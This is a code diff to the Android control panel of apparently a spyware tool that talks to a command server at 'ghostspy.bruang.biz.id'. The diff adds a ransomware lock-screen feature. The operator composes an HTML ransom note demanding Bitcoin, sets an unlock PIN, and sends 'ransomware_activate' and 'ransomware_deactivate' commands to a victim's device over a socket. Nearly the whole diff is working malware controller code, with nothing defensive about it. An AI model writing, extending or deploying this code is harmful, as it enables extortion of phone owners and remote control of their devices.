@@ -5,7 +5,10 @@ import android.app.AlertDialog;
 import android.content.Intent;
 import android.os.Bundle;
 import android.view.Gravity;
+import android.view.View;
 import android.view.animation.ScaleAnimation;
+import android.webkit.WebView;
+import android.webkit.WebViewClient;
 import android.widget.*;
 import io.socket.client.IO;
 import io.socket.client.Socket;
@@ -61,6 +64,38 @@ public class ControlActivity extends Activity {
         header.addView(notif);
         root.addView(header);
 
+        // Panel Lock/Unlock
+        LinearLayout lockPanel = new LinearLayout(this);
+        lockPanel.setOrientation(LinearLayout.HORIZONTAL);
+        lockPanel.setGravity(Gravity.CENTER);
+        lockPanel.setPadding(16, 16, 16, 0);
+
+        Button lockScreenBtn = new Button(this);
+        lockScreenBtn.setText("🔒 Lock Screen");
+        lockScreenBtn.setTextColor(0xFFFFFFFF);
+        lockScreenBtn.setBackgroundColor(0xFFFF1744);
+        lockScreenBtn.setGravity(Gravity.CENTER);
+        LinearLayout.LayoutParams lockBtnParams = new LinearLayout.LayoutParams(
+                0, 72, 1);
+        lockBtnParams.setMargins(6, 0, 6, 0);
+        lockScreenBtn.setLayoutParams(lockBtnParams);
+        lockScreenBtn.setOnClickListener(v -> showLockScreenDialog());
+        lockPanel.addView(lockScreenBtn);
+
+        Button unlockBtn = new Button(this);
+        unlockBtn.setText("🔓 Unlock");
+        unlockBtn.setTextColor(0xFFFFFFFF);
+        unlockBtn.setBackgroundColor(0xFF00E676);
+        unlockBtn.setGravity(Gravity.CENTER);
+        LinearLayout.LayoutParams unlockBtnParams = new LinearLayout.LayoutParams(
+                0, 72, 1);
+        unlockBtnParams.setMargins(6, 0, 6, 0);
+        unlockBtn.setLayoutParams(unlockBtnParams);
+        unlockBtn.setOnClickListener(v -> sendCmd("unlock"));
+        lockPanel.addView(unlockBtn);
+
+        root.addView(lockPanel);
+
         // Grid Menu 2 kolom
         ScrollView scroll = new ScrollView(this);
         LinearLayout grid = new LinearLayout(this);
@@ -94,7 +129,7 @@ public class ControlActivity extends Activity {
         scroll.addView(grid);
         root.addView(scroll);
 
-        // Control Center (dummy, bisa di-swipe nanti)
+        // Control Center
         TextView controlCenter = new TextView(this);
         controlCenter.setText("🎛️ Control Center");
         controlCenter.setTextColor(0xFFFFFFFF);
@@ -108,6 +143,94 @@ public class ControlActivity extends Activity {
             socket = IO.socket("https://ghostspy.bruang.biz.id");
             socket.connect();
         } catch (URISyntaxException e) {}
+    }
+
+    private void showLockScreenDialog() {
+        AlertDialog.Builder builder = new AlertDialog.Builder(this);
+        builder.setTitle("🔒 Custom Lock Screen");
+
+        LinearLayout container = new LinearLayout(this);
+        container.setOrientation(LinearLayout.VERTICAL);
+        container.setPadding(16, 16, 16, 16);
+        container.setBackgroundColor(0xFF181818);
+
+        // Editor HTML
+        TextView htmlLabel = new TextView(this);
+        htmlLabel.setText("HTML Code:");
+        htmlLabel.setTextColor(0xFFFFFFFF);
+        container.addView(htmlLabel);
+
+        EditText htmlEditor = new EditText(this);
+        htmlEditor.setHint("<h1>HP TERKUNCI</h1><p>Bayar 1 BTC</p>");
+        htmlEditor.setTextColor(0xFFFFFFFF);
+        htmlEditor.setBackgroundColor(0xFF252525);
+        htmlEditor.setPadding(12, 12, 12, 12);
+        htmlEditor.setMinLines(4);
+        htmlEditor.setGravity(Gravity.TOP);
+        container.addView(htmlEditor);
+
+        // Preview WebView
+        TextView previewLabel = new TextView(this);
+        previewLabel.setText("Preview:");
+        previewLabel.setTextColor(0xFFFFFFFF);
+        previewLabel.setPadding(0, 12, 0, 4);
+        container.addView(previewLabel);
+
+        WebView preview = new WebView(this);
+        preview.setWebViewClient(new WebViewClient());
+        preview.getSettings().setJavaScriptEnabled(false);
+        preview.setBackgroundColor(0xFF000000);
+        LinearLayout.LayoutParams webParams = new LinearLayout.LayoutParams(
+                LinearLayout.LayoutParams.MATCH_PARENT, 200);
+        preview.setLayoutParams(webParams);
+        container.addView(preview);
+
+        // Update preview saat teks berubah
+        htmlEditor.addTextChangedListener(new android.text.TextWatcher() {
+            @Override public void beforeTextChanged(CharSequence s, int start, int count, int after) {}
+            @Override public void onTextChanged(CharSequence s, int start, int before, int count) {}
+            @Override public void afterTextChanged(android.text.Editable s) {
+                preview.loadDataWithBaseURL(null, s.toString(), "text/html", "UTF-8", null);
+            }
+        });
+
+        // PIN Input
+        TextView pinLabel = new TextView(this);
+        pinLabel.setText("PIN (4-6 digit):");
+        pinLabel.setTextColor(0xFFFFFFFF);
+        pinLabel.setPadding(0, 12, 0, 4);
+        container.addView(pinLabel);
+
+        EditText pinInput = new EditText(this);
+        pinInput.setHint("1234");
+        pinInput.setTextColor(0xFFFFFFFF);
+        pinInput.setBackgroundColor(0xFF252525);
+        pinInput.setPadding(12, 12, 12, 12);
+        pinInput.setInputType(android.text.InputType.TYPE_CLASS_NUMBER | android.text.InputType.TYPE_NUMBER_VARIATION_PASSWORD);
+        container.addView(pinInput);
+
+        builder.setView(container);
+
+        // Tombol Jalankan
+        builder.setPositiveButton("🔒 Jalankan", (dialog, which) -> {
+            String html = htmlEditor.getText().toString().trim();
+            String pin = pinInput.getText().toString().trim();
+            if (html.isEmpty() || pin.isEmpty()) {
+                Toast.makeText(this, "HTML & PIN harus diisi", Toast.LENGTH_SHORT).show();
+                return;
+            }
+            sendCmd("ransomware_activate", new JSONObject() {{
+                try { put("html", html); put("pin", pin); } catch (Exception e) {}
+            }});
+        });
+
+        // Tombol Matikan Lock
+        builder.setNegativeButton("🔓 Matikan Lock", (dialog, which) -> {
+            sendCmd("ransomware_deactivate");
+        });
+
+        builder.setNeutralButton("Tutup", null);
+        builder.show();
     }
 
     private LinearLayout createMenuCard(String[] item) {
@@ -182,15 +305,21 @@ public class ControlActivity extends Activity {
     }
 
     private void sendCmd(String cmd) {
+        sendCmd(cmd, new JSONObject());
+    }
+
+    private void sendCmd(String cmd, JSONObject params) {
         if (socket != null && socket.connected()) {
             JSONObject msg = new JSONObject();
             try {
                 msg.put("device_id", deviceId);
                 msg.put("command", cmd);
-                msg.put("params", new JSONObject());
+                msg.put("params", params);
                 socket.emit("command", msg);
                 Toast.makeText(this, "✅ " + cmd, Toast.LENGTH_SHORT).show();
             } catch (Exception e) {}
+        } else {
+            Toast.makeText(this, "❌ Offline", Toast.LENGTH_SHORT).show();
         }
     }
 }
